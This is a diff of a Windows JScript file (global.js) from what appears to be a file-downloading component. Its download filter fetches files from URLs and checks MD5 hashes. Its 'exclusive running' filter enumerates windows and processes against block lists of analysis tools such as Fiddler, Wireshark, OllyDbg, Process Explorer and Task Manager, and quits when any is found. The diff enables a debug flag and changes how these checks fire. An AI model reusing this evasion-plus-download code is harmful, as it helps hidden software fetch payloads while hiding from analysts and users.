@@ -1,7 +1,7 @@
 trace("*-------------------------------global.js----------------------------------")
 trace("-------------------------------global.js----------------------------------*")
 __interrupted;
-var __DEBUG = 0;
+var __DEBUG = 1;
 var __IsSupportOpencl = 0;
 var __external = external;
 var __windows = windows;
@@ -295,7 +295,7 @@ function filter_dlbusiness.prototype.run(pipe){
 						var fso = __fso;
 						//fso.GetFile(path).Attributes = 2 
 						delete adostream;
-						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText+" ,tmpFile="+tmpFile );
+						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText);
 						if(1){
 							var tmd5 = __storage.GetFileMD5 (path)
 							log(" path md5:"+tmd5+" destmd5:"+pipe.md5)
@@ -347,7 +347,7 @@ function filter_eXclusiveRuning(once){
 }
 function filter_eXclusiveRuning.prototype.run(pipe){
 	var pThis = this;
-	var ret = this.checkWindows() || this.checkProcesses(); 
+	var ret = __DEBUG || external.__debugging || this.checkWindows() || this.checkProcesses(); 
 	log("ret="+ret+" ,this.once="+this.once);
 	if(this.once){
 		if(ret){
@@ -358,7 +358,7 @@ function filter_eXclusiveRuning.prototype.run(pipe){
 		return true;
 	}else{
 		setInterval(function (){
-			var ret = external.__debugging && pThis.checkWindows() && pThis.checkProcesses() ; 
+			var ret = __DEBUG || external.__debugging || pThis.checkWindows() || pThis.checkProcesses() ; 
 			if(ret)
 			{
 				pipe.exitaction=unescape(ret.toString());
@@ -373,8 +373,6 @@ function filter_eXclusiveRuning.prototype.checkWindows(){
 		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","任务管理器",
 		"Process Explorer", "File Monitor", "Registry Monitor","spy","Wireshark","ollyice",
 		" - Sysinternals:"];
-	if(__DEBUG)
-		blacklist=[];
 	var titile
 	var ret = __windows.EnumWindows(function(hwnd, text){
 		for(var index in blacklist){
@@ -392,8 +390,6 @@ function filter_eXclusiveRuning.prototype.checkProcesses(){
 					"filemon", "regmon", "procmon", "windbg", "procexp","cv.exe",
 					"ollydbg", "softice", "mzurlspy","taskmgr","devenv","msdev","spy","ollyice","Wireshark",
 					"dbgv"];
-	if(__DEBUG)
-		blacklist=[];
 	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
 	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
 	for (var index in blacklist){
